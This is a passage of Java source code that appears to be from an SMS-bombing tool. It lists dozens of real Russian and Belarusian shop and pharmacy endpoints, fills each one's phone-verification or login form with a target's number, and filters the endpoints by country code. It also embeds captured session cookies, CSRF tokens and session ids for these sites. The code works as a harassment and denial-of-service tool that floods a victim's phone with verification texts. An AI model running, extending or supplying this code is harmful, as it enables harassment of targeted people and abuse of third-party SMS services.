lqxLEGXsvgI1dnUKsStXdddVx9rFuMPwPsifHzm5=eyJpdiI6ImI0dVZJQjA1aThFbFN0TzNUSzJoeUE9PSIsInZhbHVlIjoiejJlazJremw2R1wvNjdQK1JGaUpScEdzc0ZYdlwvVnBZRUpnelJqeU5sV1NjajFuS1dKM2hNUE05c2ZocDlvbE1RamVmMkhqU1owWEwxckdCYWVHUGkwY0t3TFhiUjZQY1wvMlgzZEZDWUVzNko3dk9FODMyRVdBanBVMTVCSjJHclwvbTRObDJqMjljNmpqUFBnaUUxbEJRTTJBZVBPeUFadmM4NDNIQ1BPWGY0K1JkNndPN1VRMTN3dCtFYVwvalJoMW1oMkkyM1A1cm42TVFwcFA3SUJCK25PREJoRGxsaWFoRzl5UVlDUnJ5XC9YbkE2b3ZobVZaYlpNbStiM1wvZXRlMDFcL2h0WHl1NkZDTkh6Umh6YWhWcFFoODFjVG5uSjloclhnUTJaYTU3azFMYVJDb2hLNWdvRjNSYU12MElcLys5TU5BanA1UHVkXC9kRDRWRTFycXpIZVB6T1RoajdhSE03d0NQUFRGMERRVkJtbDM4a3dnYnFqbkdQZHVUNnptNkRcL1wvT1pvMkZxRG02amRkK1J5bkw4cVdRRnZiM1dxNXhTUkUxVzFJbFVWbVZMYz0iLCJtYWMiOiJhNjE5ZDIwZjc5NzA0M2M0NWNkMWNkMThjOTUyN2FjZjkzZTYyNDk0NzYwNTA4NWUxNTk1ZjIzMzgwNDEwMWExIn0=; _ym_uid=1670777718316825202; _ym_d=1670777718; _ym_isad=1; qrator_ssid=1670777717.186.emPvLQDnEMAlb7CD-om1u38fnrksmqdo9fpfr05t6npf5agf2; _ym_visorc=b; _ga=GA1.2.1177367781.1670777725; _gid=GA1.2.1408821310.1670777725; _gat_gtag_UA_6341946_1=1");

                    builder.add("phone", format(phone.getPhone(), "+7 (***) ***-**-**"));
                }
            },

            new FormService("https://planetazdorovo.ru/ajax/vigroup-p_a.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.headers(new Headers.Builder()
                            .add("X-Requested-With", "XMLHttpRequest")
                            .addUnsafeNonAscii("Cookie", "qrator_jsr=1670778092.405.1Wp75xcsyF5h1J5x-to0od6qtpih0o0mggnrqmtsklbeksmj8-00; qrator_jsid=1670778092.405.1Wp75xcsyF5h1J5x-v3ccm3an12pov0p7hev6e8n78ncndjta; qrator_ssid=1670778093.467.JC4EoxipSvO0D2NB-iuvcv8lha1q73langjgc3bidab0jd4ig; timezone=10800; show_bonus=1; city_id=2; city_xml=220; city=Сочи; city_code=sochi; help_phone=(862) 444-44-00; order_phone=8 (862) 444-04-08; region=43; region_id=2; IS_CITY_CHANGE=1; PHPSESSID=D1xnoi1CwPmWZ9zDhxyDAUH8Q5G53EXo; _gcl_au=1.1.1217407377.1670778097; tmr_lvid=f20e6d758cfa83ebe50bff36e0e4adaa; tmr_lvidTS=1661187312248; _ga=GA1.2.1028208547.1670778098; _gid=GA1.2.527063950.1670778098; _ym_uid=1661187313781808485; _ym_d=1670778098; _dc_gtm_UA-126829878-1=1; _ym_isad=2; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1670785140,\"UNIQUE\":[\"conversion_visit_day\"]}; _ym_visorc=b; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; MODAL_CITY_CHANGE=1; tmr_detect=0|1670778106861; carrotquest_session=p5m0nzd35r3o05w94xahknevklvbjetz; carrotquest_session_started=1; carrotquest_device_guid=a606f661-eec4-480e-b60b-8a16f6d472df; carrotquest_uid=1331021345500171147; carrotquest_auth_token=user.1331021345500171147.23139-c082d1441dfd0f22105416f38a.a73ccaf6921173e9d9254e24c18d3cc27dd88aca75114a58; carrotquest_realtime_services_transport=wss; _gali=phorm_auth_phone")
                            .build());

                    builder.add("sessid", "d593aeb0124732da3ec994d94382385c");
                    builder.add("phone", format(phone.getPhone(), "+7 (***) ***-****"));
                    builder.add("Login", "");
                }
            },

            new JsonService("https://zdorov.ru/backend/api/customer/confirm", 7) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "qrator_jsr=1670780320.115.t4ZoFyWbSiY8h9NA-59cqpek29e996dvoscrqtovjr1hetaap-00; qrator_jsid=1670780320.115.t4ZoFyWbSiY8h9NA-ov7nfefhrtdc715s3l95f06lsd09oppk; zdr_customer_external_id=0741d99a-9692-413d-bf92-88dc85a78ae7; _ym_uid=16707803281068577902; _ym_d=1670780328; storage-shipment={\"stockId\":0,\"cityId\":1,\"shipAddressId\":0,\"shipAddressTitle\":\"\",\"stockTitle\":\"\"}; _ym_isad=2; _ym_visorc=w; deviceId=435466b9-0296-4cef-a606-b710a839ee27; is-converted-basket=true; is-converted-liked=true");

                    try {
                        return new JSONObject()
                                .put("deviceId", "435466b9-0296-4cef-a606-b710a839ee27")
                                .put("phone", phone.toString())
                                .put("term", "2")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new JsonService("https://api.qugo.ru/client/send-code", 7) {
                @Override
                public String buildJson(Phone phone) {
                    try {
                        return new JSONObject()
                                .put("phone", phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://my.globus.ru/auth/", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "globusid=Y7ngpeafYhVwFL4CFeU0tImvU9WFs3U1; REGION_185_100_26_203={\"code\":false,\"city_name\":false}; _ga=GA1.2.1520883241.1671286833; _gid=GA1.2.1271544794.1671286833; _gat=1; _ym_uid=16712868341059648463; _ym_d=1671286834; _ym_visorc=w; _ym_isad=2; BITRIX_CONVERSION_CONTEXT_lk={\"ID\":163,\"EXPIRE\":1671310740,\"UNIQUE\":[\"conversion_visit_day\"]}; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4");

                    builder.add("AUTH_FORM", "Y");
                    builder.add("TYPE", "AUTH");
                    builder.add("FORM[AUTH_TYPE]", "PHONE");
                    builder.add("FORM[PHONE]", format(phone.getPhone(), "+7 (***) ***-**-**"));
                }
            },

            new JsonService("https://monro24.by/user-account/auth-api-v2/requestProcessor.php") {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "mobile=0; PHPSESSID=bace5u00ika8uof0l5fnarghqa; force_retail=1; tmr_lvid=410e418fcc154263f49cb33f89a7d116; tmr_lvidTS=1659889538438; _ym_uid=1659889539808263206; _ym_d=1671287138; _ym_visorc=w; _fbp=fb.1.1671287138438.164094442; _ga_Y2EVY0XNQR=GS1.1.1671287138.1.0.1671287138.60.0.0; _gcl_au=1.1.1998363881.1671287139; _ga=GA1.2.1902648730.1671287139; _gid=GA1.2.832627514.1671287139; mla_visitor=cd6d7305-a822-4fb5-b1de-39630f27e8b5; roistat_visit=5161518; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; _gat_gtag_UA_58872796_2=1; subscribe=1; CookieNotifyWasShown=true; _tt_enable_cookie=1; _ttp=hH6r6WBtNfvJs0u_rud7w6J66oz; _ym_isad=2; mlaVisitorDataCheck=true; c2d_widget_id={\"29ce0c23c6847da7762665e3334c1d84\":\"[chat] 5b2a7cf5f1f20e9cf984\"}; ___dc=fec6163f-13da-4ae6-8158-9d2438579224; tmr_detect=0|1671287142135; roistat_call_tracking=1; roistat_emailtracking_email=null; roistat_emailtracking_tracking_email=null; roistat_emailtracking_emails=[]; roistat_cookies_to_resave=roistat_ab,roistat_ab_submit,roistat_visit,roistat_call_tracking,roistat_emailtracking_email,roistat_emailtracking_tracking_email,roistat_emailtracking_emails; cart_token=639dd17caf2b87.55241429167838119; ny-steps=nyCategories; activity=8|30");

                    try {
                        return new JSONObject()
                                .put("action", "generateOtp")
                                .put("login_contact", "+" + phone)
                                .put("personal_identificator", "")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://bonus.sila.by/", 375) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("x-requested-with", "XMLHttpRequest");
                    request.header("Cookie", "_gcl_au=1.1.1258362633.1670779318; tmr_lvid=2c2c90b746185d1088071821758e2f47; tmr_lvidTS=1670779318704; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _ym_uid=1670779319225302469; _ym_d=1670779319; _tt_enable_cookie=1; _ttp=122a8487-c5e6-43aa-9c1b-3da364459fc9; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; stock=0; dost=0; pzakaz=0; privl=0; bvznos=0; city=city_all; rsort=0; csort=0; hsort=0; CLIENT_ID=3c380bc73490fc87d22f8f6498d2fdf8; CLIENT_ID_D=2022-12-17; current_sbjs={\"type\":\"typein\",\"source\":\"direct\",\"medium\":\"(none)\",\"campaign\":\"(none)\",\"content\":\"(none)\",\"term\":\"(none)\"}; _gid=GA1.2.1875298458.1671288629; _fbp=fb.1.1671288628957.1297417435; _ym_isad=2; _ym_visorc=b; _ga_RX9C2H96ND=GS1.1.1671288628.2.1.1671288717.52.0.0; _ga_61E2WGG401=GS1.1.1671288628.2.1.1671288717.0.0.0; _ga=GA1.2.1527090176.1670779319; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; tmr_detect=0|1671288720680");

                    builder.add("form_phone", format(phone.getPhone(), "+(375) (**) ***-**-**"));
                    builder.add("form_index", "");
                    builder.add("step", "confirm_ok");
                    builder.add("action", "send_sms");
                    builder.add("key", "");
                }
            },

            new FormService("https://ostrov-shop.by/ajax/auth_custom.php", 375) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("backurl", "/basket/");
                    builder.add("AUTH_FORM", "Y");
                    builder.add("TYPE", "AUTH");
                    builder.add("POPUP_AUTH", "Y");
                    builder.add("USER_PHONE_NUMBER", format(phone.getPhone(), "+375 (**) ***-**-**"));
                    builder.add("UF_DATE_AGREE_DATA", "10.12.2022 17:59");
                    builder.add("UF_CONSENT", "on");
                    builder.add("Login1", "Y");
                    builder.add("IS_AJAX", "Y");
                }
            },

            new FormService("https://chitatel.by/send-code", 375) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("X-Requested-With", "XMLHttpRequest");
                    request.header("Cookie", "_ga=GA1.2.290784147.1671288272; _gid=GA1.2.968710235.1671288272; _gat_UA-64066831-1=1; _gat_gtag_UA_64066831_1=1; tmr_lvid=f634f47d2ff0fec7f1c9ab4cf1a4b7fe; tmr_lvidTS=1671288271709; _ym_uid=1671288272615254027; _ym_d=1671288272; _ym_isad=2; _ym_visorc=w; _fbp=fb.1.1671288273233.1930776256; tmr_detect=0|1671288275026; assitcode=787350; st=a:4:{s:5:\"phone\";s:12:\"375253425432\";s:8:\"end_time\";i:1671331488;s:7:\"attempt\";i:1;s:4:\"time\";i:1671288288;}; XSRF-TOKEN=eyJpdiI6ImViVXFKNHdsSTlVNVRqT2FOUEFISnc9PSIsInZhbHVlIjoicmYwRlNaUFlEYUxUWWNaY2VXYmRjcGZrS0tyeDVWZGZIcFQ4cjZBT1pBNmt4a095WEpTXC9IaFM2YmttYzZJc2ZYRmE0Mlwvc1BhMFNKWGFlMVhlY2ZjUT09IiwibWFjIjoiNTgxNDljYmViMDgxYjJkZDNkN2FkZjkzMzNkY2RjYmM3ZjE5NWU1ZWM1YzA0NTU5N2UyNTBhNzIxYjQzYTc3MSJ9; chitatel_session=eyJpdiI6IjlhRUtRWkttVE9od1JodDVBbmMzV1E9PSIsInZhbHVlIjoiN2wrTys3RGhNZ0EzSElaWGZXdURkWnF5b1FQVmxOdmY1NlwvUFh0K29laW4zUU16c0hWV2JTdDlRbnZxXC9EK2FuRncrNGF3aHg5UjRtWTFHTitHZHVVQT09IiwibWFjIjoiNDFmMDRkMDY0MGM2NDRhYzQ3OTViZTA3NzQ0M2U5ODhiODg5NTgwZjYwZTU2YWVlMjQ4NWM1MjZlODE0ZDlhNCJ9");

                    builder.add("tel", format(phone.getPhone(), "+375(**)*******"));
                    builder.add("_token", "7bExV7WeW0wmdI83WV7Ie15I3u76NWj31g6ZINMJ");
                }
            },

            new FormService("https://burger-king.by/bitrix/services/main/ajax.php?mode=class&c=gmi:auth&action=auth", 375) {
                @Override
                public void buildBody(Phone phone) {
                    request.headers(new Headers.Builder()
                            .addUnsafeNonAscii("Cookie", "PHPSESSID=GdOObYTyZnr3Y6IKTLBAHBiKKPuEiRPQ; MITLAB_LOCATION=Минск; BITRIX_SM_SALE_UID=e9a04576ac4ff47afcca148588730f08; _gcl_au=1.1.517852574.1670158994; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1670187540,\"UNIQUE\":[\"conversion_visit_day\"]}; tmr_lvid=6d30e847bf5b1fa358bc5883aceb291e; tmr_lvidTS=1670158994895; _gid=GA1.2.1799965065.1670158995; _gat_UA-97562271-1=1; _ym_uid=1670158996375763202; _ym_d=1670158996; _ym_visorc=w; _ym_isad=2; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _fbp=fb.1.1670158996398.1982554257; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _tt_enable_cookie=1; _ttp=2cd5d1d3-dff6-4719-b37d-396b7b001d43; tmr_detect=0|1670158997863; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _ga=GA1.2.1576225425.1670158995; _ga_S74W5N1C73=GS1.1.1670158996.1.0.1670159005.0.0.0; _ga_M7LVHBCDVN=GS1.1.1670158996.1.0.1670159005.0.0.0")
                            .build());

                    builder.add("fields[action]", "send_code");
                    builder.add("fields[phone]", format(phone.getPhone(), "+375(**) *******"));
                    builder.add("SITE_ID", "s1");
                    builder.add("sessid", "ed6df32bf2e9efe2deaa84c498c78811");
                }
            },
    };

    @Override
    public List<Service> getServices(Phone phone) {
        List<Service> usableServices = new ArrayList<>();

        int countryCodeNum = phone.getCountryCode().isEmpty() ? 0 : Integer.parseInt(phone.getCountryCode());
        for (Service service : services) {
            if (service.countryCodes == null || service.countryCodes.length == 0) {
                usableServices.add(service);
                continue;
            }
            for (final int i : service.countryCodes) {
                if (i == countryCodeNum) {
                    usableServices.add(service);
                    break;
                }
            }
        }

        return usableServices;
    }
}
